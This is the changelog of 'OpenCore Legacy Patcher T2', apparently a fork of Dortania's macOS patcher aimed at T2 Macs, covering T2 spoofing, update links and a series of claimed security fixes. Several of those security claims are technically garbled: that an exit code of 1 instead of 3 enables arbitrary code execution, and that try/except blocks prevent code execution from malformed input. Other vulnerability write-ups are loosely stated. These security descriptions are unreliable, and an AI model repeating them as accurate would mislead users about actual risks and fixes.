- a very experimental version of iBridged to add T2 spoofing capabilities. This will allow booting into macOS 15 Sequoia and macOS 26 Tahoe, but for 26 Tahoe, at the release of iBridged 1.1.0b1 support is incomplete. The kext overall will see improvements in future alpha versions. It may have some bugs still pending to be fixed. The kext will not be automatically injected into OpenCore automatically yet, as it may be not fully stable yet. But for this to work, you need an SMBIOS of a unsupported or supported T2 Mac. On unsupported T2 Macs, you generally may not need SMBIOS spoofing to get it to work.
- All update links are changed from Dortania's original OpenCore Legacy Patcher to this repository, but the update infrastructure is not yet complete

This release also fixes the following vulnerabilities:
- sys.exit at OpenCore-Patcher-GUI.command was set 1 instead of 3. This allows attackers to crash the project to execute arbitary code and take advantage of other vulnerabilities without a human to realize. This vulnerability affects this repository only. Dortania's own is not affected by this.
- Updated follow-redirects dependency to resolve a security vulnerability (CVE-2024-28849). This prevents potential credential leakage during documentation build processes. This affects both this and Dortania's own repository.

To fix these vulnerabilities, update to the latest version available.

## 3.0.0 alpha 6
This release fixes the following:
- To Mac Pro 2019 users they were offered OpenCore EFIs for unsupported Macs, while the 2019 Mac Pro supports Tahoe natively
- On macOS 26 Tahoe Root Patching was greyed out - unblocking this feature allows any unsupported Macs to get root patches on macOS 26 Tahoe. But I have a big warning:  This project is focusing only on T2 Macs for now. On non-T2 Macs, their drivers on some Macs are full of memory corruption bugs, and macOS 26 Tahoe is very strict about this. macOS Tahoe blocks by default known vulnerable kexts by default, much more like Windows 11's Vulnerable Driver Blocklist. On macOS, disabling this is not as simple as in Windows 11 - on Windows 11, it's as easy as going to Windows Defender and disable the option for Vulnerable Driver Blocklist. On macOS, it's not like this. Also, many non-T2 Macs like the 2007-2009 Macs, had received their last update in 2018, which means their kexts are essentially frozen back in time. 

## 3.0.0 alpha 5
- fixes an issue that prevents from building the OpenCore into the disk - the fix is temporary and requires when building the EFI to enter the password inside the Terminal app
- fixes a bug where on T2 Macs it puts inside the EFI 2 Lilus and CryptexFixups.
- Removes requirements for Apple certificates

🛡️ Security & Hardening:
These vulnerabilities affect both this repository and Dortania's official repository.
Resolved Path Injection Vulnerability (CWE-427): Hardened the application entry point by stripping the current working directory from sys.path. This prevents the execution of malicious local scripts during app startup.

Internal Path Sanitization: Implemented generic error handling in the PyInstaller entry point to prevent leaking sensitive local system paths and usernames via Python tracebacks.

Privileged Execution Refactoring: Transitioned from a fixed Privileged Helper Tool binary to a dynamic sudo-based execution model, reducing dependencies on signed external binaries while maintaining system-level task capabilities.

When building the EFI, an attacker could write invalid synthax to crash the project, or worse - execute arbitary code. This is fixed by wrapping with try/except blocks.

## 3.0.0 alpha 4.3
- fixes an issue where OpenCore Legacy Patcher T2 won't open
- fixes an issue that prevents from building the OpenCore into the disk partially

## 3.0.0 alpha 4.2
- fixes a vulnerability where in constants.py the repository to check for updates was https://github.com/p8bpg9zrw7-collab/OpenCore-Legacy-Patcher-T2 - the old link. An attacker could redirect to a malicious GitHub repository or could launch a malicious redirect to install malware, for example AtomicStealer. This vulnerability affects versions from 3.0.0 alpha 2 all the way until 3.0.0 alpha 4.1.
## 3.0.0 alpha 4.1
- Fixed broken files that when uploading to GitHub they broke while uploading. This increases stability of the OpenCore Legacy Patcher T2 app.
- Changed the GitHub repository to a clean repo to clean the mess of broken files.
- Removed the iBridged.kext to clean broken files. I'm planning to readd these soon.

## 3.0.0 alpha 4
- Switch KDK comments and messages from Chinese to English
- Now iBridge's source code is no longer stored in a zip file, so you can read it at any time

## 3.0.0 alpha 3
- This version patches a security vulnerability in the networking library that could have allowed for insecure connections when downloading macOS assets or patches. (Updated requests to 2.32.2). This vulnerability affects both this repository and Dortania's official OpenCore Legacy Patcher repository. To address this vulnerability, update to the latest available release.

## 3.0.0 alpha 2
- Now it will always check for updatees from our repository instead of Dortania's
- Bug fixes in OpenCore Legacy Patcher T2 prevents from flashing the OpenCore bootloader, regardless of the Mac model.
- Add the original source code of iBridged.kext, which requires some work to fix its vulnerabilities.

## 3.0.0 alpha 1
- Add partial support for unsupported T2 Macs

## 3.0.0 (initial release of the official OpenCore Legacy Patcher 3.0.0)
- Restore support for FileVault 2 on macOS 26
- Add USB mappings for macOS 26
- Adopt Liquid Glass-conformant app icon
- Increment Binaries:
  - OpenCorePkg 1.0.5 - rolling (f03819e)
